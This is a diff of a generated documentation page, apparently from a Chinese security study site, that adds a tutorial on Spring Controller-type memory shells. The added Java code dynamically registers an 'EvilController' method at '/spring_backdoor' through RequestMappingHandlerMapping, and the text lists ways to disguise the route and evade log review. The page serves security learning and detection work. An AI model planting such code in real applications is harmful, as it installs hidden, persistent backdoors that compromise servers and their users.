@@ -2808,7 +2808,7 @@
   <a href="#controller" class="md-nav__link">
     <span class="md-ellipsis">
       
-        正常 Controller 的注册过程
+        Controller 的注册过程
       
     </span>
   </a>
@@ -2823,6 +2823,23 @@
       
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Spring Controller 型内存马的完整流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        详解
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2841,7 +2858,7 @@
   <a href="#spring-controller_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Spring Controller 型内存马的优势
+        Spring Controller 型内存马的优缺点
       
     </span>
   </a>
@@ -2849,7 +2866,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
         总结
@@ -2881,13 +2898,321 @@
 
 <h1 id="springcontroller">SpringController型内存马<a class="headerlink" href="#springcontroller" title="Permanent link">&para;</a></h1>
 <h2 id="spring-controller">为什么需要 Spring Controller 型内存马<a class="headerlink" href="#spring-controller" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Filter/Listener/Servlet 型都是容器层面的内存马，寄生在 Tomcat 的 StandardContext 中。</p>
+<p>但在实际生产环境中，绝大多数 Java Web 应用都使用 Spring 框架。在 Spring 环境下，应用的主要入口是 @Controller 或 @RestController 类，而不是直接操作 Servlet。</p>
+</blockquote>
+<p><strong>Spring Controller 型内存马的优势</strong>：</p>
+<ul>
+<li>
+<p>与业务代码高度融合，难以区分</p>
+</li>
+<li>
+<p>不依赖特定容器（Tomcat/Jetty/WebLogic 都支持）</p>
+</li>
+<li>
+<p>更贴合 Spring 应用的运行机制</p>
+</li>
+</ul>
 <h2 id="spring">Spring 请求处理的核心组件<a class="headerlink" href="#spring" title="Permanent link">&para;</a></h2>
+<p><strong>处理流程</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>用户请求 /hello
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    ↓
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>DispatcherServlet（前端控制器）
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    ↓
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>HandlerMapping（查找能处理该请求的 Controller）
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    ↓
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>HandlerAdapter（执行 Controller 方法）
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    ↓
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Controller 方法返回结果
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    ↓
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>ViewResolver 渲染视图
+</span></code></pre></div>
+<p><strong>核心对象：RequestMappingHandlerMapping</strong></p>
+<p><code>RequestMappingHandlerMapping handlerMapping = 
+    context.getBean(RequestMappingHandlerMapping.class);</code></p>
+<p>这个对象负责维护 URL → Controller 方法 的映射关系。我们的内存马就是通过动态修改这个映射表来植入后门的。</p>
+<ul>
+<li>
+<p>RequestMappingHandlerMapping 是 Spring MVC 的核心组件，负责维护所有 @RequestMapping 注解的路由映射。</p>
+</li>
+<li>
+<p>它内部有一个大 Map，结构类似于：</p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>  Map&lt;RequestMappingInfo, HandlerMethod&gt; mappingRegistry = {
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  {paths=&quot;/hello&quot;, method=GET} → HandlerMethod(HelloController, hello()),
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>  {paths=&quot;/user&quot;, method=POST} → HandlerMethod(UserController, create())
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>  }
+</span></code></pre></div>
+<ul>
+<li>registerMapping() 就是把我们的恶意 mappingInfo 和 HandlerMethod(controllerInstance, method) 添加到这个 Map 里。</li>
+</ul>
 <h2 id="spring-controller_1">Spring Controller 型内存马的核心思路<a class="headerlink" href="#spring-controller_1" title="Permanent link">&para;</a></h2>
-<h2 id="controller">正常 Controller 的注册过程<a class="headerlink" href="#controller" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>利用代码执行入口，在运行时获取 Spring 的 RequestMappingHandlerMapping，动态注册一个新的 Controller 方法，并绑定到一个指定的 URL 上，使其成为 Spring 应用中的一个正常接口。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>操作台</th>
+<th>注册对象</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Filter 型</td>
+<td>StandardContext</td>
+<td>Filter</td>
+</tr>
+<tr>
+<td>Listener 型</td>
+<td>StandardContext</td>
+<td>ServletRequestListener</td>
+</tr>
+<tr>
+<td>Servlet 型</td>
+<td>StandardContext</td>
+<td>HttpServlet</td>
+</tr>
+<tr>
+<td>Spring Controller 型</td>
+<td>RequestMappingHandlerMapping</td>
+<td>@Controller 方法</td>
+</tr>
+</tbody>
+</table>
+<h2 id="controller">Controller 的注册过程<a class="headerlink" href="#controller" title="Permanent link">&para;</a></h2>
+<p><strong>正常写法</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@RestController</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HelloController</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&quot;/hello&quot;</span><span class="p">)</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;Hello, &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;!&quot;</span><span class="p">;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="p">}</span>
+</span></code></pre></div>
+Spring 启动时，会扫描所有带有 @Controller 或 @RestController 的类，将它们的 @RequestMapping 方法注册到 RequestMappingHandlerMapping 中。</p>
+<p><strong>动态注册（内存马方式）</strong></p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">mappingInfo</span><span class="w"> </span><span class="o">=</span><span class="n">RequestMappingInfo</span><span class="p">.</span><span class="na">path</span><span class="p">(</span><span class="s">&quot;/backdoor&quot;</span><span class="p">).</span><span class="na">methods</span><span class="p">(</span><span class="n">RequestMethod</span><span class="p">.</span><span class="na">GET</span><span class="p">).</span><span class="na">build</span><span class="p">();</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1">//构建路由规则</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1">//告诉Spring，如果有人用GET方法访问/backdoor就交给恶意Controller方法</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">handlerMapping</span><span class="p">.</span><span class="na">registerMapping</span><span class="p">(</span><span class="n">mappingInfo</span><span class="p">,</span><span class="n">controllerInstance</span><span class="p">,</span><span class="n">method</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="p">);</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1">//把路由规则挂到 Spring 的“路由表”上</span>
+</span></code></pre></div>
+<ul>
+<li>
+<p>RequestMappingInfo Spring内部用来存储路由规则的对象，包含路径，HTTP方法，参数，请求头等</p>
+</li>
+<li>
+<p>RequestMappingInfo.path("/backdoor") 静态方法，开始构建一个规则指定URL路径为/backdoor</p>
+</li>
+<li>
+<p>.methods(RequestMethod.GET) 链式调用，添加限制条件只匹配GET请求</p>
+</li>
+<li>
+<p>.build(); 方法调用，完成构建生成一个不可变RequestMappingInfo对象</p>
+</li>
+</ul>
+<p><em>关键注意事项</em></p>
+<table>
+<thead>
+<tr>
+<th>事项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>paths()</code> 可以传多个路径</td>
+<td>例如 <code>.paths("/backdoor", "/admin/backdoor")</code>，绑定多个入口</td>
+</tr>
+<tr>
+<td><code>methods()</code> 可以传多个方法</td>
+<td>例如 <code>.methods(RequestMethod.GET, RequestMethod.POST)</code></td>
+</tr>
+<tr>
+<td><code>controllerInstance</code> 必须是对象</td>
+<td>不能传类，必须是 <code>new EvilController()</code> 的实例</td>
+</tr>
+<tr>
+<td><code>method</code> 必须是 <code>public</code> 方法</td>
+<td>否则 <code>getMethod()</code> 会找不到</td>
+</tr>
+</tbody>
+</table>
 <h2 id="spring-controller_2">Spring Controller 型内存马的完整流程<a class="headerlink" href="#spring-controller_2" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p><strong>构造恶意Controller方法</strong></p>
+</li>
+<li>
+<p><strong>获取RequestMappingHandlerMapping</strong>（</p>
+<ul>
+<li>
+<p>从 request 中获取 Spring 上下文</p>
+</li>
+<li>
+<p>通过 @Autowired 注入（适用于 Spring Boot 环境）</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>完整注入代码</strong>
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="w"> </span><span class="c1">// 1. 获取 Spring 上下文</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w"> </span><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">     </span><span class="n">request</span><span class="p">.</span><span class="na">getServletContext</span><span class="p">()</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">         </span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">.</span><span class="na">ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</span><span class="p">);</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w"> </span><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">handlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">     </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w"> </span><span class="c1">// 2. 获取恶意方法</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EvilController</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">     </span><span class="s">&quot;evilMethod&quot;</span><span class="p">,</span><span class="w"> </span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">     </span><span class="n">HttpServletRequest</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">     </span><span class="n">HttpServletResponse</span><span class="p">.</span><span class="na">class</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w"> </span><span class="c1">// 3. 创建映射信息</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="w"> </span><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">mappingInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestMappingInfo</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="w">     </span><span class="p">.</span><span class="na">paths</span><span class="p">(</span><span class="s">&quot;/spring_backdoor&quot;</span><span class="p">)</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="w">     </span><span class="p">.</span><span class="na">methods</span><span class="p">(</span><span class="n">RequestMethod</span><span class="p">.</span><span class="na">GET</span><span class="p">)</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="w">     </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="w"> </span><span class="c1">// 4. 注册到 HandlerMapping</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">controllerInstance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">EvilController</span><span class="p">();</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="w"> </span><span class="n">handlerMapping</span><span class="p">.</span><span class="na">registerMapping</span><span class="p">(</span><span class="n">mappingInfo</span><span class="p">,</span><span class="w"> </span><span class="n">controllerInstance</span><span class="p">,</span><span class="w"> </span><span class="n">method</span><span class="p">);</span>
+</span></code></pre></div></p>
+</li>
+</ol>
+<h3 id="_1">详解<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p><strong>定义恶意类Controller</strong></p>
+<p><strong>获取操作台Spring上下文</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getServletContext</span><span class="p">()</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="n">WebApplicationContext</span><span class="p">.</span><span class="na">ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</span><span class="p">);</span>
+</span></code></pre></div>
+- 它是什么：WebApplicationContext 是 Spring 的核心容器，里面管理着所有的 Bean（比如我们后面要用到的 HandlerMapping）。</p>
+<ul>
+<li>怎么拿到的：在 Spring Boot 中，启动时会把 WebApplicationContext 以固定属性名 ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE 存入 ServletContext。我们通过当前请求的 request 对象</li>
+</ul>
+<p><strong>找到路由管理器RequestMappingHandlerMapping</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">RequestMappingHandlerMapping</span><span class="w"> </span><span class="n">handlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">RequestMappingHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+</span></code></pre></div></p>
+<ul>
+<li>
+<p>它是什么：RequestMappingHandlerMapping 是 Spring MVC 的核心路由表，它维护了所有 @RequestMapping 注解（比如 @GetMapping）的 URL 与对应方法的映射关系。</p>
+</li>
+<li>
+<p>怎么拿到的：直接从 Spring 容器中通过 getBean 方法获取。拿到它，我们就拿到了整个应用的“路由控制权”。</p>
+</li>
+</ul>
+<p><strong>注册恶意路由</strong>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">// 1. 获取恶意方法对象</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EvilController</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&quot;evilMethod&quot;</span><span class="p">,</span><span class="w"> </span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="n">HttpServletRequest</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1">// 2. 构建映射规则</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">RequestMappingInfo</span><span class="w"> </span><span class="n">mappingInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestMappingInfo</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span><span class="p">.</span><span class="na">paths</span><span class="p">(</span><span class="s">&quot;/spring_backdoor&quot;</span><span class="p">)</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">    </span><span class="p">.</span><span class="na">methods</span><span class="p">(</span><span class="n">RequestMethod</span><span class="p">.</span><span class="na">GET</span><span class="p">)</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">    </span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="c1">// 3. 注册到 Spring 路由表</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="n">handlerMapping</span><span class="p">.</span><span class="na">registerMapping</span><span class="p">(</span><span class="n">mappingInfo</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">EvilController</span><span class="p">(),</span><span class="w"> </span><span class="n">method</span><span class="p">);</span>
+</span></code></pre></div></p>
+<ul>
+<li>
+<p>通过反射获取 EvilController 类中的 evilMethod 方法对象。我们不是直接调用，而是把它作为“处理函数”注册给 Spring。</p>
+</li>
+<li>
+<p>构建一个路由规则 RequestMappingInfo，告诉 Spring：“当用户以 GET 方式访问 /spring_backdoor 时，用这个方法处理”。</p>
+</li>
+<li>
+<p>最关键的一步！调用 handlerMapping.registerMapping()，把我们构造好的“规则”和“方法”强行写入 Spring 的核心路由表中。</p>
+</li>
+</ul>
+<p><strong>完整PoC</strong></p>
+<p><a href="../../../../code-attachment/memory-shell-code/minidemo/Spring-Controller.jsp"></a></p>
 <h2 id="filter">与 Filter 型内存马的关键差异<a class="headerlink" href="#filter" title="Permanent link">&para;</a></h2>
-<h2 id="spring-controller_3">Spring Controller 型内存马的优势<a class="headerlink" href="#spring-controller_3" title="Permanent link">&para;</a></h2>
-<h2 id="_1">总结<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Filter 型</th>
+<th>Spring Controller 型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作对象</td>
+<td>Tomcat StandardContext</td>
+<td>Spring RequestMappingHandlerMapping</td>
+</tr>
+<tr>
+<td>注册方式</td>
+<td><code>addFilterDef()</code> + <code>addFilterMap()</code></td>
+<td><code>registerMapping()</code></td>
+</tr>
+<tr>
+<td>触发方式</td>
+<td>访问特定 URL</td>
+<td>访问特定 URL</td>
+</tr>
+<tr>
+<td>依赖</td>
+<td>依赖 Tomcat</td>
+<td>依赖 Spring 框架</td>
+</tr>
+<tr>
+<td>隐蔽性</td>
+<td>中高</td>
+<td>更高（与业务代码高度融合）</td>
+</tr>
+<tr>
+<td>检测难度</td>
+<td>中</td>
+<td>高</td>
+</tr>
+<tr>
+<td>适用范围</td>
+<td>所有 Java Web 容器</td>
+<td>仅 Spring 应用</td>
+</tr>
+</tbody>
+</table>
+<h2 id="spring-controller_3">Spring Controller 型内存马的优缺点<a class="headerlink" href="#spring-controller_3" title="Permanent link">&para;</a></h2>
+<p><strong>优势</strong></p>
+<ul>
+<li>
+<p>与业务代码融合   在大量正常的 Controller 中，很难发现异常</p>
+</li>
+<li>
+<p>不依赖容器 适用于 Tomcat、Jetty、WebLogic 等所有支持 Spring 的容器</p>
+</li>
+<li>
+<p>自然回显  不像 Listener 那样需要额外处理回显</p>
+</li>
+<li>
+<p>访问日志难以识别  路径可以伪装成正常业务接口（如 /admin/status）</p>
+</li>
+</ul>
+<p><strong>局限性</strong></p>
+<ul>
+<li>
+<p>需要 Spring 环境  如果目标应用不使用 Spring，则此方法无效</p>
+</li>
+<li>
+<p>需要获取 HandlerMapping   在某些 Spring 版本中，Bean 名称可能不同</p>
+</li>
+<li>
+<p>RASP 检测   现代 RASP 会监控 registerMapping 的调用</p>
+</li>
+</ul>
+<h2 id="_2">总结<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>Spring Controller 型内存马的本质是：利用代码执行入口，获取 Spring 的 RequestMappingHandlerMapping，在运行时动态注册一个恶意 Controller 方法并绑定到指定 URL，使其融入 Spring 应用的正常请求处理流程，实现无文件后门。</p>
 </blockquote>
@@ -2943,7 +3268,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 14:53:08 UTC"><span class="timeago" datetime="2026-07-12T14:53:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 14:53:08 UTC">2026-07-12</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 20, 2026 16:26:08 UTC"><span class="timeago" datetime="2026-07-20T16:26:08+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 20, 2026 16:26:08 UTC">2026-07-20</span>
   </span>
 
     
